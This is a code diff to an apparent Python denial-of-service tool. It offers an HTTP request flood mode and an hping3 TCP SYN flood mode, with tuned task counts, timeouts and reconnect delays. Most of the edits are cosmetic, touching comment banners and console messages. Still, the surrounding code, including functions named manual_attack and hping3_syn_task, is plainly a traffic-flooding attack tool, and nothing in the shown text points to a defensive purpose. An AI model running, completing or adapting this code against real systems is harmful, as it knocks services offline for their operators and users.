@@ -34,17 +34,18 @@ NUM_TASKS = 50
 TIMEOUT = 3
 RECONNECT_DELAY = 0.01
 
+# Mode Choice
 try:
     mode_choice = console.input("[yellow]Do you want Manual HTTP (m) or hping3 SYN Flood (h)? [/yellow]")
     mode_choice = mode_choice.strip().lower()
     if mode_choice in ["h", "hping", "hping3"]:
         USE_HPING3 = True
-        console.print("[yellow]Using hping3 SYN Flood mode (TCP).[/yellow]")
+        console.print("[yellow]Using hping3 SYN Flood mode (Fourth Layer).[/yellow]")
         NUM_TASKS = 50
     else:
         USE_HPING3 = False
         console.print("[yellow]Using Manual HTTP mode.[/yellow]")
-        NUM_TASKS = 500
+        NUM_TASKS = 100
         TIMEOUT = 3
         RECONNECT_DELAY = 0.01
 except KeyboardInterrupt:
@@ -108,9 +109,9 @@ def pre_generate_headers(host, port, size=2000):
 def get_random_header():
     return random.choice(HEADER_POOL)
 
-##############
+######################
 # MANUAL HTTP ATTACK #
-##############
+######################
 async def manual_attack(host, port, use_ssl=False):
     global total_requests, total_errors
     while True:
@@ -158,9 +159,9 @@ async def manual_attack(host, port, use_ssl=False):
             await asyncio.sleep(RECONNECT_DELAY)
             continue
 
-##############
+###########################
 # HPING3 SYN FLOOD ATTACK #
-##############
+##########################
 def find_hping3():
     hping3_path = shutil.which("hping3")
     if hping3_path is None:
@@ -196,9 +197,9 @@ async def hping3_syn_task(host, port, hping3_path):
             await asyncio.sleep(0.5)
             continue
 
-##############
-# DISPLAY     #
-##############
+###########
+# DISPLAY #
+###########
 def update_display(host, port, mode):
     global total_requests, total_errors, start_time, running
     while running:
